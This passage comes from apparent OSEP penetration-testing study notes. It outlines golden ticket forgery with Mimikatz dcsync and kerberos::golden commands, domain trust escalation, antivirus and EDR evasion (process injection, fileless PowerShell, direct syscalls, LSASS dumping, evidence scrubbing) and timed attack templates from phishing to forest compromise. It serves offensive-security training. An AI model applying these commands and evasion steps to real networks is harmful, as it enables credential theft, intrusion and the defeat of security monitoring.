PHASE 4: GOLDEN TICKET
├── Prerequisites:
│   ├── Already have domain admin (to dump krbtgt hash)
│   ├── krbtgt account: domain-wide password
│   ├── Hash extracted from DC
│   └── Persistence objective
│
├── Exploitation:
│   ├── Extract krbtgt hash:
│   │   ├── Evil-WinRM access as DA
│   │   ├── Mimikatz: lsadump::dcsync /user:krbtgt
│   │   ├── Output: ntlm hash + aes256 hash
│   │   └── Both hashes cached
│   │
│   ├── Create forged golden ticket:
│   │   ├── Mimikatz: kerberos::golden
│   │   │   ├── /domain:domain.com
│   │   │   ├── /sid:S-1-5-21-xxx-xxx-xxx
│   │   │   ├── /user:Administrator
│   │   │   ├── /krbtgt:<hash>
│   │   │   ├── /ticket:admin.kirbi
│   │   │   └── Creates valid TGT
│   │   │
│   │   └── Inject ticket:
│   │       ├── kerberos::ptt /ticket:admin.kirbi
│   │       ├── TGT injected into session
│   │       └── Valid for 10 hours (renewable)
│   │
│   └── Access any service:
       ├── TGT grants access to all resources
       ├── No authentication re-required
       ├── Admin of everything
       ├── Detection: ticket age monitoring
       └── Persistence: 10 hour window renewable

PHASE 5: DOMAIN TRUST EXPLOITATION
├── Trust mapping:
│   ├── nltest /domain_trusts
│   ├── Get-ADTrust -Filter *
│   ├── Output:
│   │   ├── PARENT domain (transitive)
│   │   ├── CHILD domains
│   │   ├── EXTERNAL forest
│   │   └── Trust direction
│   │
│   └── Significance: escalation paths
│
├── Child → Parent domain escalation:
│   ├── Already: child domain admin
│   ├── Get child krbtgt hash
│   ├── Create TGT with parent's Enterprise Admin SID
│   ├── Result: parent domain access
│   ├── Entire forest compromised
│   └── Root domain (forest) controlled
│
└── Exploitation:
    ├── SID history injection
    ├── Cross-forest ticket injection
    ├── Trust abuse
    └── Full infrastructure compromise
```

---

## MODULE 05: Antivirus & EDR Evasion

### Detection Avoidance Techniques

**Bypassing modern security controls:**

```
ANTIVIRUS DETECTION MECHANISMS:

1. SIGNATURE-BASED DETECTION
   ├── Static signatures
   │   ├── Known malware hashes (MD5/SHA1/SHA256)
   ├── Behavioral signatures
   │   ├── Sequences: create process → write registry → connect network
   ├── YARA rules
   │   ├── Pattern matching (bytes, strings, structures)
   └── Machine learning
       └── Anomaly detection (unusual patterns)

2. HEURISTIC DETECTION
   ├── Dynamic analysis
   │   ├── Monitor running code
   │   ├── Execution behavior
   │   ├── System modifications
   │   └── Network communications
   ├── Emulation
   │   ├── Run code in controlled environment
   │   ├── Observe behavior
   │   ├── Identify malicious patterns
   │   └── Block suspicious execution
   └── Sandboxing
       ├── Isolated execution
       ├── System modification detection
       ├── Network activity logging
       └── False positive identification

3. BEHAVIORAL DETECTION
   ├── Process behavior monitoring
   │   ├── Creation of child processes
   │   ├── Privilege escalation attempts
   │   ├── Registry modifications
   │   ├── File system access
   │   └── Memory injection
   ├── Network monitoring
   │   ├── C2 communication patterns
   │   ├── DNS queries
   │   ├── Egress connections
   │   └── Protocol anomalies
   └── User behavior
       ├── Unusual access patterns
       ├── Off-hours activity
       ├── Lateral movement
       └── Data exfiltration

EVASION TECHNIQUES:

1. CODE OBFUSCATION
   ├── Encoding
   │   ├── XOR encoding: payload XOR <key>
   │   ├── Base64 encoding: reduce readability
   │   ├── Custom encoding: unique detection challenge
   │   └── Multilayered: XOR → Base64 → custom
   │
   ├── String obfuscation
   │   ├── Hardcoded strings: http://c2server.com
   │   ├── Obfuscated: http: followed by //c2server stored separately
   │   ├── Reconstructed at runtime
   │   └── Signature detection bypass
   │
   ├── Control flow flattening
   │   ├── Remove high-level structures
   │   ├── Convert to jumps/branches
   │   ├── Complex analysis required
   │   ├── Functionality preserved
   │   └── Signature matching fails
   │
   └── Dead code injection
       ├── Add non-functional code
       ├── Confuse analysis
       ├── Increase file size
       ├── Change entropy values
       └── Signature match failure

2. BEHAVIORAL EVASION
   ├── Sandbox/VM detection
   │   ├── CPUID instruction: detect hypervisor
   │   ├── Registry checks: VM-specific keys
   │   ├── Timing analysis: suspicious delays
   │   ├── File system artifacts: VM software
   │   └── Network MAC addresses: VM vendors
   │
   ├── Analysis environment detection
   │   ├── Debugger detection: IsDebuggerPresent()
   │   ├── Anti-disassembly: instruction confusion
   │   ├── Anti-tampering: integrity checks
   │   ├── Timing attacks: long loops (detect single-step)
   │   └── Tool detection: monitor tools, wireshark, etc.
   │
   ├── Timing manipulation
   │   ├── Sleep commands: delay execution
   │   ├── Random delays: avoid detection timing
   │   ├── Activity spreading: distribute communications
   │   ├── Off-hours operation: avoid business hour anomalies
   │   └── Legitimate behavior simulation
   │
   └── Living off the land
       ├── Use built-in tools: PowerShell, WMI, COM
       ├── No external executables
       ├── Whitelisted by default
       ├── Reduced forensic artifacts
       └── Signature detection unlikely

3. PROCESS INJECTION
   ├── Code injection
   │   ├── WriteProcessMemory: write shellcode
   │   ├── CreateRemoteThread: execute shellcode
   │   ├── Runs in legitimate process context
   │   ├── May evade process monitoring
   │   └── Runs with parent process privileges
   │
   ├── DLL injection
   │   ├── LoadLibraryA: load custom DLL
   │   ├── Executes in target process
   │   ├── DLL_PROCESS_ATTACH: initialization
   │   ├── Legitimate process loads malicious DLL
   │   └── Activity attributed to parent process
   │
   ├── Reflective DLL injection
   │   ├── Load DLL into memory (no disk)
   │   ├── No LoadLibraryA call (suspicious)
   │   ├── Manual import resolution
   │   ├── Fileless execution
   │   └── Disk signature detection bypassed
   │
   └── Process hollowing
       ├── Create suspended process
       ├── Replace executable image with payload
       ├── Resume execution
       ├── Payload runs as original process
       └── Process monitoring may be fooled

4. FILELESS EXECUTION
   ├── PowerShell in-memory
   │   ├── powershell.exe -NoProfile -ExecutionPolicy Bypass
   │   ├── -Command "IEX (Get-Content script.ps1)"
   │   ├── Script loaded from web/registry
   │   ├── No disk files
   │   └── Signature detection challenging
   │
   ├── Windows registry abuse
   │   ├── Store payload in registry value
   │   ├── Retrieval via reg query
   │   ├── Execution in memory
   │   ├── No files created
   │   └── Forensic recovery difficult
   │
   ├── WMI event subscriptions
   │   ├── Persistent execution
   │   ├── Memory-only operation
   │   ├── Event-driven triggering
   │   ├── Process tree monitoring bypass
   │   └── Detection challenge
   │
   └── COM object manipulation
       ├── Execute via COM automation
       ├── Excel, Word automation
       ├── No suspicious process spawning
       ├── Legitimate application context
       └── Whitelisted application protection

EDR BYPASS:

1. DRIVER-LEVEL ACCESS
   ├── Reflective driver loading
   │   ├── Load driver into kernel without installer
   │   ├── Bypass user-mode hooks
   │   ├── Direct kernel execution
   │   ├── Requires kernel-mode code
   │   └── Extreme privilege elevation
   │
   ├── Vulnerable driver exploitation
   │   ├── Load known vulnerable driver
   │   ├── Kernel privilege access
   │   ├── EDR hook bypass
   │   ├── Signature detection evasion
   │   └── Full system compromise
   │
   └── Kernel function hooking
       ├── Bypass user-mode API hooks
       ├── Direct syscall use
       ├── EDR detection evasion
       ├── Requires administrative privilege
       └── Advanced technique

2. DIRECT SYSCALL
   ├── Concept
   │   ├── Bypass ntdll.dll API hooks
   │   ├── Call kernel directly via syscalls
   │   ├── EDR typically hooks user-mode APIs
   │   ├── Direct kernel calls bypass hooks
   │   └── Requires syscall number knowledge
   │
   ├── Implementation
   │   ├── mov r10, rcx        ; parameter setup
   │   ├── mov rax, <syscall>  ; syscall number
   │   ├── syscall            ; direct kernel call
   │   ├── Bypasses ntdll hooks
   │   └── EDR evasion
   │
   └── Tools
       ├── SysWhispers (generate syscall stubs)
       ├── Odzhan's ntdll spoofing
       ├── Custom implementations
       └── Syscall number varies by Windows version

3. MEMORY MANIPULATION
   ├── LSASS dumping bypass
   │   ├── PPLKiller (disable Protected Process Light)
   │   ├── Hardware breakpoint bypass
   │   ├── Direct LSASS memory access
   │   ├── Credential extraction
   │   └── EDR detection bypass
   │
   ├── Registry access
   │   ├── SAM registry access
   │   ├── SYSTEM registry access
   │   ├── Encrypted data extraction
   │   ├── Credential recovery
   │   └── EDR monitoring evasion
   │
   └── Memory scrubbing
       ├── Overwrite executed code
       ├── Erase forensic evidence
       ├── Prevent memory forensics
       ├── Timeline manipulation
       └── Post-exploitation cleanup
```

---

## Quick Reference

### Critical TTPs (Tactics, Techniques, Procedures)

```
ATTACK SEQUENCE TEMPLATES:

TEMPLATE 1: EXTERNAL → DOMAIN ADMIN (5-7 days)
├── Day 1: Phishing → Initial access
├── Day 2: Persistence + privilege escalation
├── Day 3: Domain enumeration
├── Day 4: Kerberoasting (crack service account)
├── Day 5: Service account access → lateral movement
├── Day 6: Domain admin compromise
└── Day 7: Forest root compromise

TEMPLATE 2: INSIDER ACCESS (1-2 days)
├── Hour 1: Credential theft
├── Hour 2: Domain enumeration
├── Hour 4: Kerberoasting / Delegation abuse
├── Hour 8: Domain admin access
└── Hour 24: Forest root

TEMPLATE 3: MULTI-STAGE (weeks)
├── Week 1: External access (web shell)
├── Week 2: Persistence (scheduled task)
├── Week 3: Lateral movement (RDP, WinRM)
├── Week 4: Domain foothold (user account)
├── Week 5: Privilege escalation (kernel exploit)
├── Week 6: Domain admin (Kerberoasting)
├── Week 7: Enterprise admin (trust exploitation)
└── Week 8: Forest compromise + long-term backdoors

PRIORITIZED TARGETS:
1. SQL Server (database access, service account)
2. Exchange server (email, credentials)
3. SCCM (software distribution, admin rights)
4. Print servers (unconstrained delegation)
5. Service accounts (domain admin often)
6. Backup systems (full data access)
7. Domain controllers (infrastructure control)
```

---

**OSEP | Offensive Security | "The goal is not to compromise the domain. The goal is to understand WHY the domain is compromisable."**

**By DarcHacker**  
**LinkedIn:** [Mostafa Ibrahim](https://www.linkedin.com/in/mostafa-ibrahim-60b543341)  
**Last Updated:** 2026-07-04  
**Document Status:** Complete & Production-Ready
